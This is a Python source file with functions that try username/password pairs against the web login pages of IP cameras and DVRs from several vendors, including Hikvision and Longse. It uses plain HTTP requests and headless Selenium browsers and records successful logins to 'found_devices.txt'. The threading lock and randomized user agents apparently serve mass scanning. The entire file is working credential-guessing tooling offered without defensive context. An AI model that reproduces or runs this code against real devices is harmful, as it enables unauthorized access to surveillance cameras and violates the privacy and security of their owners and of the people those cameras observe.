import colorama
from colorama import Fore, Style
import requests
from .user_agent_tools import randomUserAgent
from datetime import datetime
import threading
import bs4
import base64
import time
from selenium import webdriver
from selenium.webdriver.common.by import By

DEFAULT_TIMEOUT = 2
DEFAULT_WAIT_TIME = 45


def check_http_auth__SANETRON(ip, port, username, password, thread_lock:threading.Lock, write_to_file:callable) -> None:
    try:
        url = f"http://{ip}:{port}/vb.htm"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
            "If-Modified-Since": "0",
            "X-Requested-With": "XMLHttpRequest",
            "DNT": "1",
            "Connection": "keep-alive",
            "Referer": f"http://{ip}:{port}/",
        }
        cookies = {
            "updateTips": "true",
            "userName": username,
            "pwd": password,
            "lang": "tr",
            "loginsuccess": "tr",
            "modifypsw": "true"
        }
        params = {
            "setloginpro": "",
            "setlogin": username,
            "setloginip": ip
        }
        response = requests.get(url, headers=headers, cookies=cookies, params=params, auth=(username, password), timeout=2)
        
        if response.status_code == 200:
            print(colorama.Fore.GREEN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                  f"Valid credentials found - {url} (User: {username}, Pass: {password})" + colorama.Fore.RESET)
            
            write_to_file("found_devices.txt", f"{url} (User: {username}, Pass: {password})")
            return True
    except:
        pass
    
    return False


def check_http_auth__HAIKON(ip:str, port:any, username:str, password:str, thread_lock:threading.Lock, write_to_file:callable) -> bool:
    try:
        url = f"http://{ip}:{port}/doc/page/login.asp"
        
        # Configure Chrome options for headless mode and security
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-download-notification')
        chrome_options.add_argument('--safebrowsing-disable-download-protection')
        
        # Disable file downloads
        prefs = {
            "download.default_directory": "/dev/null",
            "download.prompt_for_download": False,
            "download.directory_upgrade": True,
            "safebrowsing.enabled": True
        }
        chrome_options.add_experimental_option("prefs", prefs)
        
        # Initialize webdriver with configured options
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(DEFAULT_WAIT_TIME)
        
        try:
            driver.get(url)
            time.sleep(4)
            # Find and fill username field
            username_field = driver.find_element(By.ID, "UserName")
            username_field.send_keys(username)
            
            # Find and fill password field  
            password_field = driver.find_element(By.ID, "Password")
            password_field.send_keys(password)
            
            # Click login button
            login_button = driver.find_element(By.CSS_SELECTOR, ".loginbtn")
            login_button.click()
            
            # Wait for redirect or error
            time.sleep(1)
            
            # Check if login successful by looking for elements that appear after login
            if len(driver.find_elements(By.ID, "Password")) == 0        :
                with thread_lock:
                    print(colorama.Fore.GREEN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                          f"Valid credentials found - {url} (User: {username}, Pass: {password})" + colorama.Fore.RESET)
                    write_to_file("found_devices.txt", f"{url}|{username}|{password}")
                return True
                
        finally:
            driver.quit()
    except Exception as e:
        pass
    return False




def check_http_auth__Hikvision(ip:str, port:any, username:str, password:str, thread_lock:threading.Lock, write_to_file:callable) -> bool:
    try:
        url = f"http://{ip}:{port}/doc/page/login.asp"
        
        # Configure Chrome options for headless mode and security
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-download-notification')
        chrome_options.add_argument('--safebrowsing-disable-download-protection')
        
        # Disable file downloads
        prefs = {
            "download.default_directory": "/dev/null",
            "download.prompt_for_download": False,
            "download.directory_upgrade": True,
            "safebrowsing.enabled": True
        }
        chrome_options.add_experimental_option("prefs", prefs)
        
        # Initialize webdriver with configured options
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(DEFAULT_WAIT_TIME)
        
        try:
            driver.get(url)
            time.sleep(4)
            
            # Find and fill username field
            username_field = driver.find_element(By.ID, "username")
            username_field.send_keys(username)
            
            # Find and fill password field  
            password_field = driver.find_element(By.ID, "password")
            password_field.send_keys(password)
            
            # Find login button
            login_button__1 = driver.find_elements(By.CSS_SELECTOR, "#login > table > tbody > tr > td.login-m > div > div.login-item.bottom > button")
            login_button__2 = driver.find_elements(By.CSS_SELECTOR, "#login > table > tbody > tr > td.login-m > div > div:nth-child(5) > button")

            if len(login_button__1) != 0:
                login_button = login_button__1[0]
            elif len(login_button__2) != 0:
                login_button = login_button__2[0]
            else:
                return False
            
            login_button.click()
            
            # Wait for redirect or error
            time.sleep(2)
            
            # Check if login successful by looking for error message
            error_message = driver.find_elements(By.CSS_SELECTOR, "#login > table > tbody > tr > td.login-m > div > div.login-error > div > label")
            if len(error_message) == 0:
                with thread_lock:
                    print(colorama.Fore.GREEN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                          f"Valid credentials found - {url} (User: {username}, Pass: {password})" + colorama.Fore.RESET)
                    write_to_file("found_devices.txt", f"{url}|{username}|{password}")
                return True
            else:
                print(colorama.Fore.RED + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                      f"Invalid credentials - {url} (User: {username}, Pass: {password})" + colorama.Fore.RESET)
                return False
        finally:
            driver.quit()
    except Exception as e:
        pass
    return False





def check_http_auth__Longse(ip:str, port:any, username:str, password:str, thread_lock:threading.Lock, write_to_file:callable) -> bool:
    try:
        url = f"http://{ip}:{port}/"
        
        # Configure Chrome options for headless mode and security
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-download-notification')
        chrome_options.add_argument('--safebrowsing-disable-download-protection')
        
        # Disable file downloads
        prefs = {
            "download.default_directory": "/dev/null",
            "download.prompt_for_download": False,
            "download.directory_upgrade": True,
            "safebrowsing.enabled": True
        }
        chrome_options.add_experimental_option("prefs", prefs)
        
        # Initialize webdriver with configured options
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(DEFAULT_WAIT_TIME)
        
        try:
            driver.get(url)
            time.sleep(15)
            

            # Find and fill username field
            username_field = driver.find_element(By.ID, "userName")
            username_field.send_keys(username)
            
            # Find and fill password field  
            password_field = driver.find_element(By.ID, "pwd")
            password_field.send_keys(password)
            
            # Click login button
            login_button = driver.find_element(By.CSS_SELECTOR, ".logining-btn")
            login_button.click()
            
            # Wait for redirect or error
            time.sleep(1)
            
            target_text = driver.find_elements(By.CSS_SELECTOR, ".alert-content")
            
            if "error" in target_text[0].text.lower().strip() or "failed" in target_text[0].text.lower().strip() or "invalid" in target_text[0].text.lower().strip() or "wrong" in target_text[0].text.lower().strip():
                return False            
            else:   
                with thread_lock:
                    print(colorama.Fore.GREEN + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                          f"Valid credentials found - {url} (User: {username}, Pass: {password})" + colorama.Fore.RESET)
                    write_to_file("found_devices.txt", f"{url}|{username}|{password}")
                return True
                
        finally:
            driver.quit()
    except Exception as e:
        pass
    return False



